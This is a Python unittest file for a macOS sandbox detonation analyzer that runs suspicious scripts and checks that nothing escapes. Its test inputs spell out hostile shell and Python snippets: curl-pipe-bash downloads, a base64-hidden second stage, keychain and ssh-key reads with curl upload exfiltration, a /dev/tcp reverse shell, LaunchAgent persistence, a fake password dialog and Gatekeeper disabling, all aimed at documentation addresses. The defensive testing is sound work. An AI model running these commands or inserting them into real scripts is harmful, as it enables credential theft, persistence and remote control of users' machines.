"""Tests for cerber.detonate – behavioural analysis (detonation) of suspicious scripts.

Every script here is a SYNTHETIC, inert malware-like snippet: no real malware, all network
targets are RFC 5737 TEST-NET documentation addresses (192.0.2.x / 198.51.100.x / 203.0.113.x)
and example domains, and nothing can escape the Seatbelt sandbox (which is exactly what several
of these tests assert).

Each functional test additionally asserts that NOTHING escaped: no file in the real home or
~/Library/LaunchAgents, no outbound network connection (a loopback listener that must stay
silent), and that only the FAKE home's bait – never the real keychain – is reachable.

By default the tests disable the noexec disk-image volume (CERBER_NO_NOEXEC=1) so they run in a
few seconds each; the macOS Seatbelt profile – the primary containment and the thing these tests
exercise – is byte-for-byte identical with or without that volume. One dedicated test runs with
the real volume and verifies it is detached afterwards.

    .venv/bin/python -m unittest tests.test_detonate
"""
from __future__ import annotations

import os
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))

from cerber import detonate  # noqa: E402

REAL_HOME = os.path.expanduser("~")
_SKIP = None
if sys.platform != "darwin" or not os.path.exists("/usr/bin/sandbox-exec"):
    _SKIP = "detonation requires macOS sandbox-exec"


def _bids(result: dict) -> set[str]:
    return {b["id"] for b in result["behaviors"]}


def _det_names(result: dict) -> set[str]:
    return {d["name"] for d in result["detections"]}


def _run(src: str, kind: str, timeout: int = 10) -> dict:
    d = tempfile.mkdtemp(prefix="cerber-detonate-test-")
    ext = ".py" if kind == "python" else ".sh"
    p = os.path.join(d, "sample" + ext)
    with open(p, "w") as fh:
        fh.write(src)
    try:
        return detonate.detonate_file(p, kind, timeout=timeout)
    finally:
        import shutil
        shutil.rmtree(d, ignore_errors=True)


@unittest.skipIf(_SKIP, _SKIP or "")
class EligibilityTests(unittest.TestCase):
    def _mk(self, name: str, body: bytes) -> str:
        d = tempfile.mkdtemp(prefix="cerber-elig-")
        p = os.path.join(d, name)
        with open(p, "wb") as fh:
            fh.write(body)
        self.addCleanup(lambda: __import__("shutil").rmtree(d, ignore_errors=True))
        return p

    def test_shell_suspicious(self):
        p = self._mk("x.sh", b"#!/bin/bash\ncurl http://192.0.2.1/a | bash\n")
        self.assertEqual(detonate.eligible({"verdict": "SUSPICIOUS", "detections": []}, p), "bash")

    def test_python_by_shebang(self):
        p = self._mk("x", b"#!/usr/bin/env python3\nimport os\n")
        self.assertEqual(detonate.eligible({"verdict": "MALICIOUS", "detections": []}, p), "python")

    def test_zsh_shebang(self):
        p = self._mk("x.command", b"#!/bin/zsh\necho hi\n")
        self.assertEqual(detonate.eligible({"verdict": "PUA", "detections": []}, p), "zsh")

    def test_clean_without_behaviour_detection_is_ineligible(self):
        p = self._mk("x.sh", b"#!/bin/bash\necho hello world\n")
        self.assertIsNone(detonate.eligible({"verdict": "CLEAN", "detections": []}, p))

    def test_clean_but_obfuscation_detection_is_eligible(self):
        p = self._mk("x.sh", b"#!/bin/bash\necho hi\n")
        res = {"verdict": "INFO", "detections": [{"name": "Heur:SHELL.Obfuscated"}]}
        self.assertEqual(detonate.eligible(res, p), "bash")

    def test_macho_never_eligible(self):
        # Mach-O magic – must be refused even with a scary verdict
        p = self._mk("x", b"\xcf\xfa\xed\xfe" + b"\x00" * 64)
        self.assertIsNone(detonate.eligible({"verdict": "MALICIOUS", "detections": []}, p))

    def test_too_big_is_ineligible(self):
        p = self._mk("x.sh", b"#!/bin/bash\n" + b"# padding\n" * 200000)
        self.assertIsNone(detonate.eligible({"verdict": "MALICIOUS", "detections": []}, p))


@unittest.skipIf(_SKIP, _SKIP or "")
class DetonationTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._prev = os.environ.get("CERBER_NO_NOEXEC")
        os.environ["CERBER_NO_NOEXEC"] = "1"      # Seatbelt identical; skip the slow disk image
        detonate._stage_pipeline()                # warm the analyzer pipeline once

    @classmethod
    def tearDownClass(cls):
        if cls._prev is None:
            os.environ.pop("CERBER_NO_NOEXEC", None)
        else:
            os.environ["CERBER_NO_NOEXEC"] = cls._prev

    # -- helpers for escape assertions -------------------------------------------------
    def assert_no_real_home_artifact(self, relpath: str):
        p = os.path.join(REAL_HOME, relpath)
        self.assertFalse(os.path.exists(p), f"ESCAPE: {p} was created in the real home")

    # -- benign ------------------------------------------------------------------------
    def test_benign_clean(self):
        r = _run("#!/bin/bash\necho hello\ndate\nuname -a\nid\n", "bash", timeout=8)
        self.assertTrue(r["ran"])
        self.assertEqual(r["verdict"], "CLEAN")
        self.assertEqual(r["behaviors"], [])

    # -- base64-decoded curl | bash chain ----------------------------------------------
    def test_download_execute_base64_chain(self):
        # echo <b64 of 'curl http://192.0.2.5/a.sh | bash'> | base64 -d | bash
        import base64
        inner = base64.b64encode(b"curl http://192.0.2.5/a.sh | bash").decode()
        src = f"#!/bin/bash\necho {inner} | base64 -d | bash\ncurl http://198.51.100.9/s | bash\n"
        r = _run(src, "bash", timeout=10)
        self.assertEqual(r["verdict"], "MALICIOUS", r["behaviors"])
        self.assertIn("download_exec", _bids(r))
        targets = {n["target"] for n in r["network"]}
        # the decoded stage's URL (192.0.2.5) proves the base64|bash chain actually unfolded
        self.assertTrue({"192.0.2.5", "198.51.100.9"} & targets, targets)
        self.assert_no_real_home_artifact(".cerber-detonate-canary")

    # -- LaunchAgent + launchctl load --------------------------------------------------
    def test_persistence_launchagent(self):
        src = ("#!/bin/bash\n"
               "mkdir -p ~/Library/LaunchAgents\n"
               "cat > ~/Library/LaunchAgents/com.cerber.detonate-test.plist <<EOT\n"
               "<plist></plist>\nEOT\n"
               "launchctl load ~/Library/LaunchAgents/com.cerber.detonate-test.plist\n")
        r = _run(src, "bash", timeout=10)
        self.assertNotEqual(r["verdict"], "CLEAN")
        self.assertIn("persistence", _bids(r))
        # the write went to the FAKE home only – the real LaunchAgents dir must be untouched
        self.assert_no_real_home_artifact("Library/LaunchAgents/com.cerber.detonate-test.plist")

    # -- keychain / browser bait read + curl -F exfil ----------------------------------
    def test_credential_access_and_exfil(self):
        src = ("#!/bin/bash\n"
               "cat ~/login.keychain-db | head -c 8\n"
               "cat ~/.ssh/id_rsa | head -c 8\n"
               "security dump-keychain 2>/dev/null\n"
               "curl -F file=@/tmp/loot.zip http://198.51.100.20/upload\n")
        r = _run(src, "bash", timeout=10)
        self.assertEqual(r["verdict"], "MALICIOUS", r["behaviors"])
        self.assertIn("credential_access", _bids(r))
        self.assertIn("exfiltration", _bids(r))
        # the bait reads that actually happened are from the FAKE home (start with ~), never the
        # real keychain
        self.assertTrue(any("keychain" in f.lower() for f in r["files_read"]), r["files_read"])
        for f in r["files_read"]:
            self.assertTrue(f.startswith("~"), f"real-path leak in files_read: {f}")
        self.assertNotIn(REAL_HOME, " ".join(r["files_read"]))

    # -- fake password prompt ----------------------------------------------------------
    def test_fake_password_prompt(self):
        src = ("#!/bin/bash\n"
               "osascript -e 'display dialog \"macOS needs your password\" "
               "default answer \"\" with hidden answer'\n")
        r = _run(src, "bash", timeout=8)
        self.assertNotEqual(r["verdict"], "CLEAN")
        self.assertIn("fake_prompt", _bids(r))

    # -- quarantine / Gatekeeper bypass ------------------------------------------------
    def test_quarantine_bypass(self):
        src = ("#!/bin/bash\n"
               "xattr -d com.apple.quarantine ~/payload 2>/dev/null\n"
               "spctl --master-disable\n")
        r = _run(src, "bash", timeout=8)
        self.assertNotEqual(r["verdict"], "CLEAN")
        self.assertIn("gatekeeper_bypass", _bids(r))

    # -- python exec(base64) second stage: reads ssh key + connects to C2 --------------
    def test_python_second_stage_no_network_escape(self):
        # a loopback listener that MUST receive nothing (network is fully denied in the sandbox)
        lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        lsock.bind(("127.0.0.1", 0))
        lsock.listen(1)
        lsock.settimeout(6)
        port = lsock.getsockname()[1]
        accepted = []

        def accept_loop():
            try:
                conn, _ = lsock.accept()
                accepted.append(conn)
            except OSError:
                pass
        th = threading.Thread(target=accept_loop, daemon=True)
        th.start()

        import base64
        stage2 = (
            "import os\n"
            "try:\n open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
            "except Exception:\n pass\n"
            "import socket\n"
            "for tgt in [('198.51.100.7', 4444), ('127.0.0.1', %d)]:\n"
            " try:\n  socket.create_connection(tgt, 2).close()\n"
            " except OSError:\n  pass\n" % port
        )
        b64 = base64.b64encode(stage2.encode()).decode()
        src = f"import base64\nexec(base64.b64decode('{b64}'))\n"
        r = _run(src, "python", timeout=10)

        th.join(timeout=7)
        lsock.close()
        self.assertEqual(accepted, [], "ESCAPE: the sandboxed script reached a real TCP listener")
        self.assertNotEqual(r["verdict"], "CLEAN", r)
        self.assertIn("credential_access", _bids(r))                 # read the ssh-key bait
        self.assertTrue(any(n["target"] == "198.51.100.7" for n in r["network"]), r["network"])
        # the decoded exec() stage must have been captured and re-scanned
        self.assertTrue(r["stages"], "decoded python stage not captured")
        self.assertTrue(any("ssh" in f.lower() for f in r["files_read"]), r["files_read"])

    # -- reverse shell via /dev/tcp ----------------------------------------------------
    def test_reverse_shell_devtcp(self):
        src = "#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.11/4444 0>&1\n"
        r = _run(src, "bash", timeout=8)
        self.assertEqual(r["verdict"], "MALICIOUS", r["behaviors"])
        self.assertIn("reverse_shell", _bids(r))
        self.assertTrue(any(n["target"] == "203.0.113.11" for n in r["network"]), r["network"])

    # -- bounded fork storm: capped by RLIMIT_NPROC and fully reaped --------------------
    def test_bounded_fork_storm_is_capped_and_killed(self):
        # 300 background `sleep 913` (bounded – NOT an unbounded fork bomb). RLIMIT_NPROC stops the
        # forks well before 300 and the whole process group is killed afterwards. The distinctive
        # duration (913 s) and an exact `sleep 913` command match make strays from THIS test
        # unambiguous in `ps`.
        before = _count_sleep(913)
        src = ("#!/bin/bash\nn=0\nwhile [ $n -lt 300 ]; do\n"
               "  sleep 913 &\n  n=$((n+1))\ndone\necho done\n")
        r = _run(src, "bash", timeout=6)
        self.assertTrue(r["ran"])
        time.sleep(1.5)
        after = _count_sleep(913)
        self.assertLessEqual(after, before, f"{after - before} sleep processes survived detonation")
        self.assertEqual(after, 0, f"{after} 'sleep 913' processes present after detonation")

    # -- infinite loop: killed by the wall-clock watchdog ------------------------------
    def test_infinite_loop_timeout(self):
        r = _run("#!/bin/bash\nwhile true; do :; done\n", "bash", timeout=5)
        self.assertTrue(r["ran"])
        self.assertTrue(r["timed_out"])
        self.assertLessEqual(r["seconds"], 25)


def _count_sleep(secs: int) -> int:
    """Processes whose command is exactly `sleep <secs>` (so a shell whose argv merely *contains*
    the text is not counted)."""
    try:
        out = subprocess.run(["/bin/ps", "-axo", "command="], capture_output=True, text=True,
                             timeout=10).stdout
    except (OSError, subprocess.SubprocessError):
        return 0
    return sum(1 for line in out.splitlines() if line.strip() == f"sleep {secs}")


@unittest.skipIf(_SKIP, _SKIP or "")
class VolumeLifecycleTest(unittest.TestCase):
    """Runs a real detonation on the noexec disk-image volume and verifies no image is left."""

    def _cerber_images(self) -> set[str]:
        try:
            import plistlib
            r = subprocess.run(["/usr/bin/hdiutil", "info", "-plist"], capture_output=True,
                               timeout=30)
            imgs = plistlib.loads(r.stdout).get("images", [])
            return {i.get("image-path", "") for i in imgs
                    if "cerber-sandbox-" in i.get("image-path", "")}
        except Exception:  # noqa: BLE001
            return set()

    def test_workspace_volume_detached_afterwards(self):
        prev = os.environ.pop("CERBER_NO_NOEXEC", None)      # force the real volume
        try:
            before = self._cerber_images()
            r = _run("#!/bin/bash\necho hi\nxattr -c ~/payload 2>/dev/null\n", "bash", timeout=10)
            self.assertTrue(r["ran"])
            after = self._cerber_images()
        finally:
            if prev is not None:
                os.environ["CERBER_NO_NOEXEC"] = prev
        leaked = after - before
        self.assertEqual(leaked, set(), f"workspace disk image(s) left attached: {leaked}")


if __name__ == "__main__":
    unittest.main()
